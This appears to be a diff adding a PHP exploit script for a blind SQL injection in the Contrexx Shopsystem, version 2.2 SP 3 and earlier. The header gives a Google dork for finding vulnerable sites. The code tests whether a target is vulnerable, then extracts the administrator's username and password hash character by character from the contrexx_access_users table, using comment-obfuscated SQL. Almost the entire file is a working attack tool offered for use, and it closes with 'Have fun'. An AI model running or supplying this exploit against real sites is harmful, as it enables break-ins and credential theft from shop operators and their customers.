@@ -1,0 +1,134 @@
+#!/usr/bin/php
+<?php
+/*
+	Exploit title: Contrexx Shopsystem Blind SQL Injection Exploit
+	Exploit written by: Penguin
+	Exploit: index.php?section=shop&catId=[VALID categoryid] and [YOUR BLIND SQL CODE]
+	Exploit tested on: Debian 6, Ubuntu Linux 11.04
+	Software price: abount 700 CHF
+        Vendor: http://www.contrexx.com
+	Found by: Penguin
+	Version: =< 2.2 SP 3
+	Dork: inurl:index.php?section=shop&catId=
+	Vendor: www.contrexx.com
+	Visit: www.null-sector.info
+	Greets to: Blacktiger/Luxy, ErrorX, hAgBaRd2ooo, KrimiX, zYiix, reutz/head
+ */
+echo "#######################################\r\n";
+echo "# Contrexx Shopsystem Exploit         #\r\n";
+echo "# Exploit Type: Blind SQL Injection   #\r\n";
+echo "# Programmed by: Penguin              #\r\n";
+echo "# Visit www.null-sector.info          #\r\n";
+echo "#######################################\r\n";
+if($argc < 4)
+{
+	echo "Usage: ./exploit.php [TARGET_URL] [CATID] (Admin User Limit)\r\n";
+	echo "TARGET_URL = http://demo.de/index.php\r\n";
+	echo "CATID = CategoryId (MUST BE VALID!)\r\n";
+	echo "Admin User Limit = Limit x,0 @ Selecting! Standard: 0\r\n";
+	die();
+}
+// Config Variables
+$target_url = $argv[1] . "?section=shop&catId=" . $argv[2];
+$charset_start_usr = 33;
+$charset_end_usr = 126;
+$charset_hash = Array(48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
+$toLength = 100;
+//Functions
+function getUsername($toLength, $charset_start, $charset_end, $target_url,$limit)
+{
+	$username = "";
+	// Get Length
+	$length = -1;
+	for($i=0;$i<$toLength;$i++)
+	{
+		$url = $target_url . "/**/and/**/(select/**/length(username)/**/from/**/contrexx_access_users/**/where/**/is_admin/**/=/**/1/**/limit/**/$limit,1)=" . $i;
+		$src = file_get_contents($url);
+		if(testIt($src) == true)
+		{
+			$length = $i;
+			break;
+		}
+	}
+	if ($length == -1)
+	{
+		die("There was a problem @ fetching username length :(\r\n");
+	}
+	echo "Username length: $length !\r\n";
+	$username = "";
+	echo "Username: ";
+	for($k=0;$k<$length;$k++)
+	{
+		$charToAdd = "";
+		for($c=$charset_start;$c<$charset_end;$c++)
+		{
+			$p = $k+1;
+			$src = file_get_contents($target_url . "/**/and/**/substring((select/**/username/**/from/**/contrexx_access_users/**/where/**/is_admin/**/=/**/1/**/limit/**/$limit,1),$p,1)=char($c)");
+			if(testIt($src) == true)
+			{
+				$charToAdd = $c;
+				break;
+			}
+		}
+		echo chr($c);
+		$username .= chr($c);
+	}
+	echo "\r\n";
+	return $username;
+}
+
+function getHash($toLength, $charset, $target_url,$limit)
+{
+	// Get Hash
+
+	$hash = "";
+	echo "Hash: ";
+	for($k=0;$k<32;$k++)
+	{
+		$charToAdd = "";
+		for($c=0;$c<count($charset);$c++)
+		{
+			$p = $k+1;
+			$z = $charset[$c];
+			$src = file_get_contents($target_url . "/**/and/**/substring((select/**/password/**/from/**/contrexx_access_users/**/where/**/is_admin/**/=/**/1/**/limit/**/$limit,1),$p,1)=char($z)");
+			file_put_contents("test.html",$src);
+			if(testIt($src) == true)
+			{
+				$charToAdd = $charset[$c];
+				break;
+			}
+		}
+		echo chr($charToAdd);
+		$hash .= chr($charToAdd);
+	}
+	echo "\r\n";
+	return $hash;
+}
+
+function testIt($src)
+{
+	$check = explode("<div class=\"description\">",$src);
+	if(count($check) >= 2)
+	{
+		return true;
+	}
+	return false;
+}
+
+echo "Starting exploit....\r\nChecking if Vulnerable...";
+$check = file_get_contents($target_url . "'");
+if(testIt($check) == true)
+{
+	die("Target is not Vulnerable :(\r\n");
+}
+
+$myLimit = $argv[3];
+echo "Target is Vulnerable :)\r\n";
+echo "Starting the SQL Injection...\r\n";
+echo "Fetching Username...\r\n";
+$username = getUsername($toLength, $charset_start_usr, $charset_end_usr, $target_url,$myLimit);
+$hash = getHash($toLength,$charset_hash,$target_url,$myLimit);
+echo "Exploited Successfully!\r\n";
+echo "Full Logindata: $username : $hash\r\n";
+echo "Have fun ;)\r\n";
+?>
